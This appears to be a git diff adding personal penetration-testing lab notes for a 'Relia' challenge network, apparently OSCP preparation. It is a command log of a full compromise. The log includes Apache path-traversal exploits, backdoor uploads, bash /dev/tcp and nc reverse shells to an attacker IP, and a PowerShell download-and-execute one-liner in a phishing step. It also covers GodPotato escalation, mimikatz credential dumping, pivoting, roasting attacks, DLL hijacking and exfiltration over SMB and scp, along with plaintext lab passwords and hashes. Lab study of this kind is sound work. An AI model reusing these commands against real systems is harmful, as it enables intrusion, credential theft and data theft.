@@ -1785,3 +1785,325 @@ proxychains -q impacket-psexec -hashes "<:NTHASH>" medtech.com/DomainAdmin@172.1
 	- achieve a full shell on the DC now that you are domain admin
 ```
 
+**Relia**
+```
+sudo nmap -sS -p 1-10000 -Pn -iL external.txt| tee externalScan.txt
+
+sudo nmap -sV -sC -p 1-10000 -Pn -iL external.txt| tee ExternalScriptScan.txt
+
+searchsploit apache 2.4.49
+
+searchsploit -m multiple/webapps/50383.sh
+
+./50383.sh targets.txt /etc/passwd 
+
+sh test.sh
+
+curl --silent --path-as-is --insecure -k "192.168.178.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa"
+
+chmod 0600 anita_id_ecdsa.key
+
+john --wordlist=/usr/share/wordlists/rockyou.txt anita_ssh.hash
+
+ssh -p 2222 anita@192.168.178.245 -i anita_id_ecdsa.key
+
+On 192.168.178.245:
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	wget -O linpeas.sh http://192.168.45.213:8082/linpeas.sh
+	./linpeas.sh | tee ANITA_LINPEAS_OUTPUT.txt
+	sudo --version
+	git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git		-->		(https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
+	make && ./exploit
+
+On 192.168.178.246:
+	ssh -p 2222 anita@192.168.178.246 -i 245_files/anita_id_ecdsa.key
+	ss -antp
+	ssh -N -R 127.0.0.1:9999:127.0.0.1:8000 kali@192.168.45.213
+		curl "http://127.0.0.1:9999/backend/?view=php://filter/resource=../../../../../../../../../etc/passwd"
+	wget -O /var/crash/test.php http://192.168.45.213:8083/simple-backdoor.php					--> this is the backdoor from pentest monkey, NOT normal simple-backdoor.php
+		nc -nvlp 6666
+	curl "http://127.0.0.1:9999/backend/?view=php://filter/resource=../../../../../../../../../var/crash/test.php"
+	[access is gained as www-data]
+	sudo -l
+	sudo bash -i >& /dev/tcp/192.168.45.213/7777 0>&1
+	[access is gaine as root]
+	unshadow passwd shadow >> unshadowed.txt
+	john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+nxc smb 192.168.178.248 -u anonymous -p "" --shares
+
+smbclient //192.168.178.248/transfer -U anonymous
+	cd \r14_2022\build\DNN\wwwroot\
+	put cmdasp.aspx
+
+keepass2john Database.kdbx >> hash.keepass
+hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+keepass2 Database.kdbx
+	[several passwords are recovered]
+
+
+nxc smb 192.168.178.248 -u emma -p "SomersetVinyl1\!" --local-auth
+
+On 192.168.178.248:
+	powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencode-here-4444> --> at http://192.168.178.248/cmdasp.aspx
+	whoami /priv
+	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
+	.\GodPotato.exe -cmd "powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencoded-command-5555>"
+	[access is gaine as NT authority]
+	net user /add added_user Password1# 
+	net localgroup administrators added_user /add
+	net localgroup "Remote Desktop Users" added_user /add
+	xfreerdp /v:192.168.178.248 /u:added_user /p:Password1#
+	[graphical RDP access is gained as added_user (an Administrator)]
+	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
+	.\mimikatz.exe
+		privilege::debug
+		log
+		sekurlsa::logonpasswords
+	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winPEASx64.exe
+	.\winPEASx64.exe log=WINPEAS_SYSTEM_248.txt
+	
+impacket-secretsdump Administrator@192.168.178.248 -hashes ":56e4633688c0fdd57c610faf9d7ab8df"
+
+sudo masscan -p1-65535,U1:65535 192.168.178.247 --rate=1000 -e tun0
+
+sudo nmap -sV -sC -p 14020,14080 192.168.178.247
+
+ftp -p 192.168.178.247 14020
+	- get umbraco.pdf
+
+searchsploit umbraco 7
+searchsploit -m aspx/webapps/49488.py
+python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c whoami
+
+git clone https://github.com/crypticsilence/umbraco-pseudoshell.git
+	change:
+		login = "mark@relia.com";
+		password="OathDeeplyReprieve91";
+		host = "http://web02.relia.com:14080";
+python2 umps.py
+On 192.168.247.247:
+	powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencoded-revshell-4444>
+	whoami /priv
+	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
+	.\GodPotato.exe -cmd "psencoded-revshell-5555"
+	[access is gained as SYSTEM]
+	Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
+	net user added_user Password1# /add
+	net localgroup administrators added_user /add
+	net localgroup "Remote Desktop Users" added_user /add
+	xfreerdp /v:192.168.247.247 /u:added_user /p:"Password1#"
+	[graphical administrative access is gained as added_user]
+	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winPEASx64.exe
+	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
+	.\winPEASx64.exe log=WINPEAS_SYSTEM_247.txt
+	.\mimikatz.exe
+		token::elevate
+		privilege::debug
+		sekurlsa::logonpasswords
+	[output from post-exploitation is exfiltrated over ftp]
+	netstat -ano | findstr 127.0.0.1
+	ssh -N -R 127.0.0.1:9999:127.0.0.1:14147 kali@192.168.45.213
+
+impacket-secretsdump Administrator@192.168.247.247 -hashes ":2f2b8d5d4d756a2c72c554580f970c14" | tee 247_files/secretsDumpHashes.txt
+
+feroxbuster -u http://192.168.247.249:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
+feroxbuster -u http://192.168.247.249:8000/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
+	login admin : admin at http://192.168.247.249:8000/cms/admin.php
+searchsploit rite cms
+searchsploit -m php/webapps/50616.txt
+	[logged in as admin : admin] > Files Manager > Upload file > simple-backdoor.php as simple-backdoor.pHP > http://192.168.247.249:8000/cms/media/backdoor.pHP?cmd=whoami
+	http://192.168.247.249:8000/cms/media/backdoor.pHP?cmd=powershell.exe%20-ep%20bypass%20-w%20hidden%20-NoP%20-EncodedCommand%20<psencoded-revshell>
+
+On 192.168.247.249
+	[access is gained as legacy\adrian]
+	whoami /priv
+	cd C:\Users\Public\Documents
+	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
+	iwr -uri http://192.168.45.213:8082/nc64.exe -OutFile nc64.exe
+	.\GodPotato.exe -cmd "nc64.exe -e cmd.exe 192.168.45.213 8887"
+	[access is gained as SYSTEM]
+	net user /add added_user Password1#
+	net localgroup administrators added_user /add
+	net localgroup "Remote Desktop Users" added_user /add
+	xfreerdp /v:192.168.247.249 /u:added_user /p:"Password1#"
+	[graphical administrative access is gained as added_user]
+	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
+	.\mimikatz.exe
+		privilege::debug
+		token::elevate
+		log
+		sekurlsa::logonpasswords
+		sudo impacket-smbserver -user test -pass test -smb2support share .		--> on attacker
+	iwr -uri http://192.168.45.213:8082/winpeas.bat -OutFile winpeas.bat
+	.\winpeas.bat >> WINPEAS_BAT_ADMIN_249.txt
+	net use \\192.168.45.213\share /u:test test	
+	copy mimikatz.log \\192.168.45.213\share\
+	copy WINPEAS_ADMIN_PASSWORDS_249.txt \\192.168.45.213\share\
+	scp -r C:\staging\.git kali@192.168.45.213:/home/kali/ChallengeLabs/Relia/249_files/gitRepository/
+		impacket-secretsdump Administrator@192.168.247.249 -hashes ":387aef0561b65e4f3cae0960b0fba2d5"
+		crackmapexec smb 192.168.247.249 -u Administrator -H 387aef0561b65e4f3cae0960b0fba2d5 -x 'net localgroup "Remote Desktop Users" damon /add'
+		crackmapexec smb 192.168.247.249 -u Administrator -H 387aef0561b65e4f3cae0960b0fba2d5 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+	xfreerdp /v:192.168.247.249 /u:damon /pth:"820d6348890893116880101307197052"
+	[graphical access is gained as the damon user]
+	cd C:\staging
+	git log
+	git show 8b430c17c16e6c0515e49c4eafdd129f719fde74		--> this shows jim@relia.com, webdmz@relia.com, and phishing intel
+
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+swaks --to jim@relia.com --from maildmz@relia.com --auth-user maildmz@relia.com --header "Subject: Changes to the git repository" --body "Please review this recent change to the git repository at C:\\staging on 192.168.247.249" --server 192.168.247.189 --attach @/home/kali/webdav/config.Library-ms --suppress-data -ap
+	- powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213:8082/powercat.ps1');powercat -c 192.168.45.213 -p 4444 -e powershell"
+
+On 172.16.207.14
+	[access is gained as relia\jim via phishing]
+	net domain /user
+	iwr -uri http://192.168.45.213:8082/chisel.exe -OutFile chisel.exe
+		chisel server --port 8085 --reverse
+	.\chisel client 192.168.45.213:8085 R:socks
+	[WK01 is now used as a pivot point into the internal network]
+	iwr -uri http://192.168.45.213:8082/PowerUp.ps1 -OutFile PowerUp.ps1
+	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winpeas.exe
+	.\winpeas.exe log=WINPEAS_JIM_14.txt
+	iwr -uri http://192.168.45.213:8082/SharpHound.ps1 -OutFile SharpHound.ps1
+	. .\SharpHound.ps1
+	Invoke-BloodHound -CollectionMethod All -OutputDirectory .\ -OutputPrefix "INGESTION_14"
+		sudo neo4j start
+		bloodhound
+		MATCH (m:User) RETURN m 		--> andrea has first degree group membership in INTRANETRDP
+	type C:\Users\jim\Pictures\exec.ps1
+	net use \\192.168.45.213\share /u:test test
+	copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.213\share
+		keepass2john Database.kdbx >> hash.keepass
+		hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule		--> recovered password as mercedes1
+		keepass2 Database.kdbx
+
+xfreerdp /v:192.168.235.191 /u:dmzadmin /p:"SlimGodhoodMope"
+	[graphical access is gained to .191 as dmzadmin]
+	[proof.txt is collected]
+
+
+proxychains -q crackmapexec smb internal.txt -u anonymous -p "" --shares
+proxychains -q crackmapexec smb 172.16.207.14 -u maildmz -p DPuBT9tGCBrTbR
+proxychains -q crackmapexec smb internal.txt  -u maildmz -p DPuBT9tGCBrTbR --shares
+	proxychains -q smbmap -H 172.16.207.21 -u maildmz -p DPuBT9tGCBrTbR -d relia
+proxychains -q smbclient \\\\172.16.207.21\\apps -U relia.com\\maildmz
+proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.207.6 relia.com/maildmz:"DPuBT9tGCBrTbR"
+proxychains -q impacket-GetNPUsers relia.com/ -dc-ip 172.16.207.6 -format hashcat -usersfile domain/domain_users.txt
+proxychains -q crackmapexec smb 172.16.207.6 -u maildmz -p DPuBT9tGCBrTbR --groups >> domain/domain_groups.txt
+proxychains -q crackmapexec smb 172.16.207.6 -u maildmz -p DPuBT9tGCBrTbR --users
+
+sudo hashcat -m 18200 michelle.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+proxychains -q crackmapexec smb internal.txt -u michelle -p "NotMyPassword0k?"
+proxychains -q crackmapexec smb internal.txt -u michelle -p "NotMyPassword0k?" --shares
+proxychains -q crackmapexec smb internal.txt -u jim -p "Castello1\!"
+
+proxychains -q xfreerdp /v:172.16.195.7 /u:michelle /p:"NotMyPassword0k?"
+	[graphical access is gained to INTRANET as michelle]
+	iwr -uri http://192.168.45.213:8082/PowerUp.ps1 -OutFile PowerUp.ps1
+	. .\PowerUp.ps1
+	Invoke-AllChecks
+	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winpeas.exe
+	.\winpeas.exe log=WINPEAS_MICHELLE_7.txt
+	Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}
+	icacls C:\Scheduler\scheduler.exe
+	icacls C:\Scheduler\
+		[scheduler.exe is transferred to WINPREP and analyzed with Procmon64.exe for missing DLLs]
+		[grab malicious dll code from https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp]
+		[insert psencoded reverse shell]
+		x86_64-w64-mingw32-gcc beyondhelper.c --shared -o beyondhelper.dll
+	net use \\192.168.45.213\share
+	copy \\192.168.45.213\share\beyondhelper.dll C:\Scheduler\beyondhelper.dll
+	sc stop Scheduler
+	sc start Scheduler
+	[local Adminstrative access is gained on INTRANET]
+	net user /add added_user Password1#
+	net localgroup administrators added_user /add
+	net localgroup "Remote Desktop Users" added_user /add
+	net localgroup "Remote Management Users" added_user /add
+	proxychains -q xfreerdp /v:172.16.210.7 /u:added_user /p:"Password1#"
+	[graphical administrative access is gained to .7 as added_user]
+	[secrets are dumped with mimikatz]
+		hashcat -m 1000 7_files/crack.ntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+		proxychains -q impacket-secretsdump Administrator@172.16.210.7 -hashes ":8b4547a5116dd13e6e206d1286a06b28"
+
+proxychains -q xfreerdp /v:172.16.210.15 /u:andrea /p:"PasswordPassword_6"
+	[access is gained to .15 (WK01) as andrea]
+	[psencoded-revshell is added to C:\schedule.ps1]
+	[access to .15 is gained as milana]
+	[milana local admin is used to create a new administrative user]
+	[graphical admin access is gained to .15]
+	[mimikatz is used to dump credentials]
+	[secretsdump is used to dump credentials as milana]
+	[winpeas discovers C:\Users\milana\Documents\Database.kdbx]
+		keepass2john Database.kdbx >> hash.keepass 
+		hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule		--> destiny1 is the password
+		keepass2 Database.kdbx
+		[sarahs private SSH key is recovered]
+
+chmod 0600 sarah_id.key
+proxychains -q ssh -i sarah_id.key sarah@172.16.210.19
+	[access is gained to .19 via SSH as sarah]
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	ls -al /etc/cron.d
+	sudo -l
+	find / -name *backup* 2>/dev/null
+	ls -al /opt/
+	[usb.img is copied to kali]
+		sudo mount -o loop usb.img /mnt/
+	wget -O pspy64 http://192.168.45.213:8082/pspy64
+	./pspy64
+	sudo /usr/bin/borg list borgbackup/
+	sudo /usr/bin/borg extract --stdout borgbackup::home
+	[amy password is cracked via crackstation.net]
+	su - amy
+	sudo su -
+	[access is gained as root]
+	/home/sarah/linpeas.sh | tee LINPEAS_ROOT_19.txt
+
+proxychains -q ssh  andrew@172.16.146.20
+	[ssh access is gained to .20 as andrew]
+	[linpeas is downloaded and executed]
+	find / -type f -perm -u=s 2>/dev/null
+	find / -name doas.conf 2>/dev/null
+	doas -u root service apache24 onestart
+	sockstat -4 -l
+	ssh -N -R 127.0.0.1:9000:127.0.0.1:80 kali@192.168.45.213
+	find / -wholename */www/* 2>/dev/null | head -n 25
+	wget -O /usr/local/www/apache24/data/phpMyAdmin/tmp/backdoor.php http://192.168.45.213:8083/simple-backdoor.php
+	browse to "http://localhost:9000/phpMyAdmin/tmp/backdoor.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.213%2F7777%200%3E%261%27"
+	[reverse shell access is gained as www, who is in the wheel group]
+	/usr/local/bin/wget -O linpeas.sh http://192.168.45.213:8082/linpeas.sh
+	./linpeas.sh | tee LINPEAS_WWW_20.txt
+		/usr/local/bin/curl http://192.168.45.213:8082/linpeas.sh | sh | tee LINPEAS_WWW_20.txt
+	cat /usr/local/etc/doas.conf			--> permit nopass :wheel
+	/usr/local/bin/doas -u root su -
+	[access is gained to .20 as root via doas]
+	/usr/local/bin/curl http://192.168.45.213:8082/linpeas.sh | sh | tee LINPEAS_WWW_20.txt
+	cat /home/mountuser/.history
+
+proxychains -q crackmapexec smb internal.txt -u mountuser -p "DRtajyCwcbWvH/9" --shares
+proxychains -q smbclient \\\\172.16.146.21\\scripts -U relia.com\\mountuser
+proxychains -q smbclient \\\\172.16.146.21\\monitoring -U relia.com\\mountuser
+	recurse ON
+	prompt OFF
+	mget *
+	[all files from both monitoring and scripts are retrieved as mountuser, who has read access]
+	grep -r "assw" .						--> reveals that ./PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt contains a plaintext password for relia.com\\Administrator on line 20
+
+proxychains -q crackmapexec smb internal.txt -u Administrator -p "vau\!XCKjNQBv2$"
+proxychains -q nxc rdp internal.txt -u Administrator -p "vau\!XCKjNQBv2$"
+
+proxychains -q nxc smb 172.16.146.6 -u Administrator -p "vau\!XCKjNQBv2$" -x "<psencoded-reverse-shell>"
+	[on each of the remaining machines]
+	powershell.exe -Command 'Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue'
+
+crackmapexec smb 192.168.186.189 -u Administrator -p "vau\!XCKjNQBv2$"
+impacket-smbexec relia.com/Administrator:"vau\!XCKjNQBv2$"@192.168.186.189
+proxychains -q nxc smb 172.16.146.6 -u Administrator -p "vau\!XCKjNQBv2$" -x "<psencoded-reverse-shell>"
+	cmd.exe /c where /R C:\ proof.txt
+	cmd.exe /c where /R C:\ local.txt
+
+
+
+```
